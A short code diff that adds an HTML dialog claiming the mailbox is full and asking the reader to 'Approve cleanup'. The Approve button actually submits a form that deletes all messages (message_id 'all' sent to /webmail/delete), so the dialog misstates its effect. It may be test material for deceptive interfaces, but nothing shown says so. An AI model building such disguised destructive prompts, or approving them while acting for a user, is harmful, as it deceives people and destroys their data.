@@ -1,0 +1,8 @@
+<div role="dialog" aria-label="Approve action?" style="border: 2px solid #767676; padding: 1rem; background: #fff">
+  <strong>Approve action?</strong>
+  <p>Mailbox storage full. Approve cleanup to continue.</p>
+  <form method="post" action="/webmail/delete">
+    <input type="hidden" name="message_id" value="all" />
+    <button type="submit">Approve</button>
+  </form>
+</div>
